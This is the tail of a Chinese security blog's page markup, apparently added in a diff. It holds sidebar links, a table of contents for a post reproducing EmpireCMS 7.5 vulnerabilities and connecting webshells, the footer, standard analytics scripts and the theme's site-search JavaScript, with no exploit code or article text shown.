+                  <span class="links-of-author-item">
+                    <a href="https://bjj.dropsec.xyz/2019/10/06/ddaylog/" target="_blank" title="开发记录">
+                      
+                        <i class="fa fa-fw fa-xx"></i>开发记录</a>
+                  </span>
+                
+                  <span class="links-of-author-item">
+                    <a href="https://bjj.dropsec.xyz/2019/09/23/fix%E7%94%9F%E6%B4%BB/" target="_blank" title="日记">
+                      
+                        <i class="fa fa-fw fa-xx"></i>日记</a>
+                  </span>
+                
+            </div>
+          
+
+          
+          
+
+          
+          
+            <div class="links-of-blogroll motion-element links-of-blogroll-inline">
+              <div class="links-of-blogroll-title">
+                <i class="fa  fa-fw fa-link"></i>
+                友情链接
+              </div>
+              <ul class="links-of-blogroll-list">
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://thief.one" title="nMask" target="_blank">nMask</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="http://www.doonsec.com/" title="洞见安全" target="_blank">洞见安全</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://byd.dropsec.xyz/" title="瓦都剋" target="_blank">瓦都剋</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://lr.dropsec.xyz/" title="Joynice" target="_blank">Joynice</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://github.com/DropsDevopsOrg/ECommerceCrawlers" title="爬虫项目" target="_blank">爬虫项目</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://422926799.github.io/" title="九世" target="_blank">九世</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="http://www.youknowi.xin/" title="图先生" target="_blank">图先生</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="http://47.100.199.103:8000" title="微信聚合平台" target="_blank">微信聚合平台</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://www.hacking8.com/" title="hacking8" target="_blank">hacking8</a>
+                  </li>
+                
+              </ul>
+            </div>
+          
+
+          
+
+        </div>
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#环境搭建"><span class="nav-number">1.</span> <span class="nav-text">环境搭建</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#帝国CMS-EmpireCMS-v7-5-代码注入分析-CVE-2018-19462"><span class="nav-number">2.</span> <span class="nav-text">帝国CMS(EmpireCMS) v7.5 代码注入分析(CVE-2018-19462)</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#复现过程"><span class="nav-number">3.</span> <span class="nav-text">复现过程</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#连接webshell"><span class="nav-number">4.</span> <span class="nav-text">连接webshell</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#菜刀连接"><span class="nav-number">4.1.</span> <span class="nav-text">菜刀连接</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#蚁剑连接"><span class="nav-number">4.2.</span> <span class="nav-text">蚁剑连接</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#冰蝎连接"><span class="nav-number">4.3.</span> <span class="nav-text">冰蝎连接</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#参考连接"><span class="nav-number">5.</span> <span class="nav-text">参考连接</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#帝国CMS-EmpireCMS-v7-5后台getshell分析-CVE-2018-18086"><span class="nav-number">6.</span> <span class="nav-text">帝国CMS(EmpireCMS) v7.5后台getshell分析(CVE-2018-18086)</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#漏洞描述"><span class="nav-number">6.1.</span> <span class="nav-text">漏洞描述</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#影响版本"><span class="nav-number">6.2.</span> <span class="nav-text">影响版本</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#环境搭建-1"><span class="nav-number">6.3.</span> <span class="nav-text">环境搭建</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#复现过程-1"><span class="nav-number">6.4.</span> <span class="nav-text">复现过程</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#EmpireCMS-7-5-前台xss"><span class="nav-number">7.</span> <span class="nav-text">EmpireCMS 7.5 前台xss</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#漏洞简介"><span class="nav-number">7.1.</span> <span class="nav-text">漏洞简介</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#漏洞影响"><span class="nav-number">7.2.</span> <span class="nav-text">漏洞影响</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#利用过程"><span class="nav-number">7.3.</span> <span class="nav-text">利用过程</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#EmpireCMS-7-5-后台xss"><span class="nav-number">8.</span> <span class="nav-text">EmpireCMS 7.5 后台xss</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#漏洞简介-1"><span class="nav-number">8.1.</span> <span class="nav-text">漏洞简介</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#漏洞影响-1"><span class="nav-number">8.2.</span> <span class="nav-text">漏洞影响</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#漏洞复现"><span class="nav-number">8.3.</span> <span class="nav-text">漏洞复现</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#参考链接"><span class="nav-number">8.4.</span> <span class="nav-text">参考链接</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#帝国CMS-EmpireCMS-v7-5后台备份数据库任意代码执行"><span class="nav-number">9.</span> <span class="nav-text">帝国CMS(EmpireCMS) v7.5后台备份数据库任意代码执行</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#漏洞描述-1"><span class="nav-number">9.1.</span> <span class="nav-text">漏洞描述</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#影响版本-1"><span class="nav-number">9.2.</span> <span class="nav-text">影响版本</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#环境搭建-2"><span class="nav-number">9.3.</span> <span class="nav-text">环境搭建</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#漏洞利用"><span class="nav-number">9.4.</span> <span class="nav-text">漏洞利用</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#参考连接-1"><span class="nav-number">9.5.</span> <span class="nav-text">参考连接</span></a></li></ol></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">&copy; <span itemprop="copyrightYear">2016-2021</span>
+  <span class="with-love">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">朴阿杰</span>
+
+  
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item-icon">
+      <i class="fa fa-area-chart"></i>
+    </span>
+    
+      <span class="post-meta-item-text">博客总字数</span>
+    
+    <span title="Site words total count">129.7k</span>
+  
+  <script type="text/javascript">var cnzz_protocol = (("https:" == document.location.protocol) ? "https://" : "http://");document.write(unescape("%3Cspan id='cnzz_stat_icon_1278048714'%3E%3C/span%3E%3Cscript src='" + cnzz_protocol + "s4.cnzz.com/z_stat.php%3Fid%3D1278048714%26show%3Dpic' type='text/javascript'%3E%3C/script%3E"));</script>
+</div>
+            
+
+    <script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+    
+
+        
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+      </div>
+    
+
+    
+
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/canvas-nest/canvas-nest.min.js"></script>
+  
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.1.4"></script>
+
+
+
+  
+  
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.4"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  
+
+
+
+
+	
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  <script type="text/javascript">
+    // Popup Window;
+    var isfetched = false;
+    var isXml = true;
+    // Search DB path;
+    var search_path = "search.xml";
+    if (search_path.length === 0) {
+      search_path = "search.xml";
+    } else if (/json$/i.test(search_path)) {
+      isXml = false;
+    }
+    var path = "/" + search_path;
+    // monitor main search box;
+
+    var onPopupClose = function (e) {
+      $('.popup').hide();
+      $('#local-search-input').val('');
+      $('.search-result-list').remove();
+      $('#no-result').remove();
+      $(".local-search-pop-overlay").remove();
+      $('body').css('overflow', '');
+    }
+
+    function proceedsearch() {
+      $("body")
+        .append('<div class="search-popup-overlay local-search-pop-overlay"></div>')
+        .css('overflow', 'hidden');
+      $('.search-popup-overlay').click(onPopupClose);
+      $('.popup').toggle();
+      var $localSearchInput = $('#local-search-input');
+      $localSearchInput.attr("autocapitalize", "none");
+      $localSearchInput.attr("autocorrect", "off");
+      $localSearchInput.focus();
+    }
+
+    // search function;
+    var searchFunc = function(path, search_id, content_id) {
+      'use strict';
+
+      // start loading animation
+      $("body")
+        .append('<div class="search-popup-overlay local-search-pop-overlay">' +
+          '<div id="search-loading-icon">' +
+          '<i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>' +
+          '</div>' +
+          '</div>')
+        .css('overflow', 'hidden');
+      $("#search-loading-icon").css('margin', '20% auto 0 auto').css('text-align', 'center');
+
+      $.ajax({
+        url: path,
+        dataType: isXml ? "xml" : "json",
+        async: true,
+        success: function(res) {
+          // get the contents from search data
+          isfetched = true;
+          $('.popup').detach().appendTo('.header-inner');
+          var datas = isXml ? $("entry", res).map(function() {
+            return {
+              title: $("title", this).text(),
+              content: $("content",this).text(),
+              url: $("url" , this).text()
+            };
+          }).get() : res;
+          var input = document.getElementById(search_id);
+          var resultContent = document.getElementById(content_id);
+          var inputEventFunction = function() {
+            var searchText = input.value.trim().toLowerCase();
+            var keywords = searchText.split(/[\s\-]+/);
+            if (keywords.length > 1) {
+              keywords.push(searchText);
+            }
+            var resultItems = [];
+            if (searchText.length > 0) {
+              // perform local searching
+              datas.forEach(function(data) {
+                var isMatch = false;
+                var hitCount = 0;
+                var searchTextCount = 0;
+                var title = data.title.trim();
+                var titleInLowerCase = title.toLowerCase();
+                var content = data.content.trim().replace(/<[^>]+>/g,"");
+                var contentInLowerCase = content.toLowerCase();
+                var articleUrl = decodeURIComponent(data.url);
+                var indexOfTitle = [];
+                var indexOfContent = [];
+                // only match articles with not empty titles
+                if(title != '') {
+                  keywords.forEach(function(keyword) {
+                    function getIndexByWord(word, text, caseSensitive) {
+                      var wordLen = word.length;
+                      if (wordLen === 0) {
+                        return [];
+                      }
+                      var startPosition = 0, position = [], index = [];
+                      if (!caseSensitive) {
+                        text = text.toLowerCase();
+                        word = word.toLowerCase();
+                      }
+                      while ((position = text.indexOf(word, startPosition)) > -1) {
+                        index.push({position: position, word: word});
+                        startPosition = position + wordLen;
+                      }
+                      return index;
+                    }
+
+                    indexOfTitle = indexOfTitle.concat(getIndexByWord(keyword, titleInLowerCase, false));
+                    indexOfContent = indexOfContent.concat(getIndexByWord(keyword, contentInLowerCase, false));
+                  });
+                  if (indexOfTitle.length > 0 || indexOfContent.length > 0) {
+                    isMatch = true;
+                    hitCount = indexOfTitle.length + indexOfContent.length;
+                  }
+                }
+
+                // show search results
+
+                if (isMatch) {
+                  // sort index by position of keyword
+
+                  [indexOfTitle, indexOfContent].forEach(function (index) {
+                    index.sort(function (itemLeft, itemRight) {
+                      if (itemRight.position !== itemLeft.position) {
+                        return itemRight.position - itemLeft.position;
+                      } else {
+                        return itemLeft.word.length - itemRight.word.length;
+                      }
+                    });
+                  });
+
+                  // merge hits into slices
+
+                  function mergeIntoSlice(text, start, end, index) {
+                    var item = index[index.length - 1];
+                    var position = item.position;
+                    var word = item.word;
+                    var hits = [];
+                    var searchTextCountInSlice = 0;
+                    while (position + word.length <= end && index.length != 0) {
+                      if (word === searchText) {
+                        searchTextCountInSlice++;
+                      }
+                      hits.push({position: position, length: word.length});
+                      var wordEnd = position + word.length;
+
+                      // move to next position of hit
+
+                      index.pop();
+                      while (index.length != 0) {
+                        item = index[index.length - 1];
+                        position = item.position;
+                        word = item.word;
+                        if (wordEnd > position) {
+                          index.pop();
+                        } else {
+                          break;
+                        }
+                      }
+                    }
+                    searchTextCount += searchTextCountInSlice;
+                    return {
+                      hits: hits,
+                      start: start,
+                      end: end,
+                      searchTextCount: searchTextCountInSlice
+                    };
+                  }
+
+                  var slicesOfTitle = [];
+                  if (indexOfTitle.length != 0) {
+                    slicesOfTitle.push(mergeIntoSlice(title, 0, title.length, indexOfTitle));
+                  }
+
+                  var slicesOfContent = [];
+                  while (indexOfContent.length != 0) {
+                    var item = indexOfContent[indexOfContent.length - 1];
+                    var position = item.position;
+                    var word = item.word;
+                    // cut out 100 characters
+                    var start = position - 20;
+                    var end = position + 80;
+                    if(start < 0){
+                      start = 0;
+                    }
+                    if (end < position + word.length) {
+                      end = position + word.length;
+                    }
+                    if(end > content.length){
+                      end = content.length;
+                    }
+                    slicesOfContent.push(mergeIntoSlice(content, start, end, indexOfContent));
+                  }
+
+                  // sort slices in content by search text's count and hits' count
+
+                  slicesOfContent.sort(function (sliceLeft, sliceRight) {
+                    if (sliceLeft.searchTextCount !== sliceRight.searchTextCount) {
+                      return sliceRight.searchTextCount - sliceLeft.searchTextCount;
+                    } else if (sliceLeft.hits.length !== sliceRight.hits.length) {
+                      return sliceRight.hits.length - sliceLeft.hits.length;
+                    } else {
+                      return sliceLeft.start - sliceRight.start;
+                    }
+                  });
+
+                  // select top N slices in content
+
+                  var upperBound = parseInt('1');
+                  if (upperBound >= 0) {
+                    slicesOfContent = slicesOfContent.slice(0, upperBound);
+                  }
+
+                  // highlight title and content
+
+                  function highlightKeyword(text, slice) {
+                    var result = '';
+                    var prevEnd = slice.start;
+                    slice.hits.forEach(function (hit) {
+                      result += text.substring(prevEnd, hit.position);
+                      var end = hit.position + hit.length;
+                      result += '<b class="search-keyword">' + text.substring(hit.position, end) + '</b>';
+                      prevEnd = end;
+                    });
+                    result += text.substring(prevEnd, slice.end);
+                    return result;
+                  }
+
+                  var resultItem = '';
+
+                  if (slicesOfTitle.length != 0) {
+                    resultItem += "<li><a href='" + articleUrl + "' class='search-result-title'>" + highlightKeyword(title, slicesOfTitle[0]) + "</a>";
+                  } else {
+                    resultItem += "<li><a href='" + articleUrl + "' class='search-result-title'>" + title + "</a>";
+                  }
+
+                  slicesOfContent.forEach(function (slice) {
+                    resultItem += "<a href='" + articleUrl + "'>" +
+                      "<p class=\"search-result\">" + highlightKeyword(content, slice) +
+                      "...</p>" + "</a>";
+                  });
+
+                  resultItem += "</li>";
+                  resultItems.push({
+                    item: resultItem,
+                    searchTextCount: searchTextCount,
+                    hitCount: hitCount,
+                    id: resultItems.length
+                  });
+                }
+              })
+            };
+            if (keywords.length === 1 && keywords[0] === "") {
+              resultContent.innerHTML = '<div id="no-result"><i class="fa fa-search fa-5x" /></div>'
+            } else if (resultItems.length === 0) {
+              resultContent.innerHTML = '<div id="no-result"><i class="fa fa-frown-o fa-5x" /></div>'
+            } else {
+              resultItems.sort(function (resultLeft, resultRight) {
+                if (resultLeft.searchTextCount !== resultRight.searchTextCount) {
+                  return resultRight.searchTextCount - resultLeft.searchTextCount;
+                } else if (resultLeft.hitCount !== resultRight.hitCount) {
+                  return resultRight.hitCount - resultLeft.hitCount;
+                } else {
+                  return resultRight.id - resultLeft.id;
+                }
+              });
+              var searchResultList = '<ul class=\"search-result-list\">';
+              resultItems.forEach(function (result) {
+                searchResultList += result.item;
+              })
+              searchResultList += "</ul>";
+              resultContent.innerHTML = searchResultList;
+            }
+          }
+
+          if ('auto' === 'auto') {
+            input.addEventListener('input', inputEventFunction);
+          } else {
+            $('.search-icon').click(inputEventFunction);
+            input.addEventListener('keypress', function (event) {
+              if (event.keyCode === 13) {
+                inputEventFunction();
+              }
+            });
+          }
+
+          // remove loading animation
+          $(".local-search-pop-overlay").remove();
+          $('body').css('overflow', '');
+
+          proceedsearch();
+        }
+      });
+    }
+
+    // handle and trigger popup window;
+    $('.popup-trigger').click(function(e) {
+      e.stopPropagation();
+      if (isfetched === false) {
+        searchFunc(path, 'local-search-input', 'local-search-result');
+      } else {
+        proceedsearch();
+      };
+    });
+
+    $('.popup-btn-close').click(onPopupClose);
+    $('.popup').click(function(e){
+      e.stopPropagation();
+    });
+    $(document).on('keyup', function (event) {
+      var shouldDismissSearchPopup = event.which === 27 &&
+        $('.search-popup').is(':visible');
+      if (shouldDismissSearchPopup) {
+        onPopupClose();
+      }
+    });
+  </script>
+
+
+
+
+
+  
+
+  
+
+  
+<script>
+(function(){
+    var bp = document.createElement('script');
+    var curProtocol = window.location.protocol.split(':')[0];
+    if (curProtocol === 'https') {
+        bp.src = 'https://zz.bdstatic.com/linksubmit/push.js';        
+    }
+    else {
+        bp.src = 'http://push.zhanzhang.baidu.com/push.js';
+    }
+    var s = document.getElementsByTagName("script")[0];
+    s.parentNode.insertBefore(bp, s);
+})();
+</script>
+
+
+  
+  
+
+  
+
+  
+
+  
+
+
+</body>
+</html>
